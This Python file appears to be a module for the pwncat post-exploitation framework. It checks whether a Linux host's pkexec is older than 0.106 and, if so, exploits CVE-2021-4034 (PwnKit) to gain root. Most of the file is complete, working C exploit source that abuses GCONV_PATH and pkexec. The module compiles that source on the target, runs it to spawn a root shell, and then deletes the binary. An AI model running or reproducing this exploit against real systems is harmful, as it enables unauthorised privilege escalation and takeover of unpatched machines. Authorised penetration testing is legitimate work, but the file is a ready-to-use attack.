#!/usr/bin/env python3
import textwrap
import subprocess
from io import StringIO

from packaging.version import InvalidVersion, parse

import pwncat
from pwncat.facts import ExecuteAbility
from pwncat.modules import ModuleFailed
from pwncat.subprocess import CalledProcessError
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule


class CVE_2021_4034(ExecuteAbility):
    """Exploit CVE-2021-4034 (PwnKit)"""

    def __init__(self, source: str):
        super().__init__(source=source, source_uid=None, uid=0)

    def shell(self, session: "pwncat.manager.Session"):
        """Execute a shell with CVE-2021-4034"""

        pwnkit_source = textwrap.dedent(r"""
            #define _XOPEN_SOURCE 700
            #define _GNU_SOURCE
            #include <dirent.h>
            #include <errno.h>
            #include <fcntl.h>
            #include <stdio.h>
            #include <string.h>
            #include <unistd.h>
            #include <stdlib.h>
            #include <ftw.h>
            #include <sys/wait.h>
            #include <sys/stat.h>
            #include <sys/types.h>
            #include <sys/signal.h>

            #ifdef __amd64__
            const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
            #endif
            #ifdef __i386__
            const char service_interp[] __attribute__((section(".interp"))) = "/lib/ld-linux.so.2";
            #endif

            int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
                int rv = remove(fpath);
                if (rv) perror(fpath);
                return rv;
            }

            int rmrf(char *path) {
                return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
            }

            void entry() {
                int res;
                FILE *fp;
                char buf[PATH_MAX];
                int pipefd[2];
                char *cmd;
                int argc;
                char **argv;
                register unsigned long *rbp asm ("rbp");

                argc = *(int *)(rbp+1);
                argv = (char **)rbp+2;

                mkdir("GCONV_PATH=.", 0777);
                creat("GCONV_PATH=./.pkexec", 0777);
                mkdir(".pkexec", 0777);

                fp = fopen(".pkexec/gconv-modules", "w+");
                fputs("module UTF-8// PKEXEC// pkexec 2", fp);
                fclose(fp);

                buf[readlink("/proc/self/exe", buf, sizeof(buf))] = 0;
                symlink(buf, ".pkexec/pkexec.so");

                pipe(pipefd);
                if (fork() == 0) {
                    close(pipefd[1]);
                    buf[read(pipefd[0], buf, sizeof(buf)-1)] = 0;
                    if (strstr(buf, "pkexec --version") == buf) {
                        puts("Exploit failed. Target is most likely patched.");
                        rmrf("GCONV_PATH=.");
                        rmrf(".pkexec");
                    }
                    _exit(0);
                }

                close(pipefd[0]);
                dup2(pipefd[1], 2);
                close(pipefd[1]);

                cmd = NULL;
                if (argc > 1) {
                    cmd = memcpy(argv[1]-4, "CMD=", 4);
                }

                char *args[] = {NULL};
                char *env[] = {".pkexec", "PATH=GCONV_PATH=.", "CHARSET=pkexec", "SHELL=pkexec", cmd, NULL};
                execve("/usr/bin/pkexec", args, env);
                execvpe("pkexec", args, env);
                _exit(0);
            }

            void gconv() {}
            void gconv_init() {
                close(2);
                dup2(1, 2);
                char *cmd = getenv("CMD");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                rmrf("GCONV_PATH=.");
                rmrf(".pkexec");
                if (cmd) {
                    execve("/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL);
                } else {
                    execve("/bin/bash", (char *[]){"-i", NULL}, NULL);
                    execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
                }
                _exit(0);
            }
            """).lstrip()

        try:
            with session.platform.tempfile(mode="w", directory="/tmp") as filp:
                binary_path = filp.name

            with StringIO(pwnkit_source) as src:
                output_path = session.platform.compile(
                    [src],
                    output=binary_path,
                    cflags=["-shared", "-fPIC"],
                    ldflags=["-Wl,-e,entry"],
                )

            session.platform.run(["chmod", "+x", output_path])

            proc = session.platform.Popen(
                [binary_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            proc.detach()

            session.platform.refresh_uid()
            user = session.current_user()

            if user is None or user.name != "root":
                raise ModuleFailed("failed to get root shell (user is not root)")

            session.platform.Path(output_path).unlink()

            return

        except CalledProcessError as err:
            raise ModuleFailed(f"exploit failed: {err}") from err

    def title(self, session):
        return "[cyan]pkexec[/cyan] vulnerable to [red]CVE-2021-4034 (PwnKit)[/red]"


class Module(EnumerateModule):
    """Identify systems vulnerable to CVE-2021-4034 (PwnKit)"""

    PROVIDES = ["ability.execute"]
    PLATFORM = [Linux]
    SCHEDULE = Schedule.PER_USER

    def enumerate(self, session: "pwncat.manager.Session"):
        try:
            pkexec_info = session.run("enumerate", types=["software.pkexec.version"])[0]
        except IndexError:
            return

        user = session.current_user()
        if user is None or user.id == 0:
            return

        try:
            version = pkexec_info.version
            if version.startswith("0.1") and parse(version) < parse("0.106"):
                yield CVE_2021_4034(self.name)
        except (InvalidVersion, ValueError):
            return
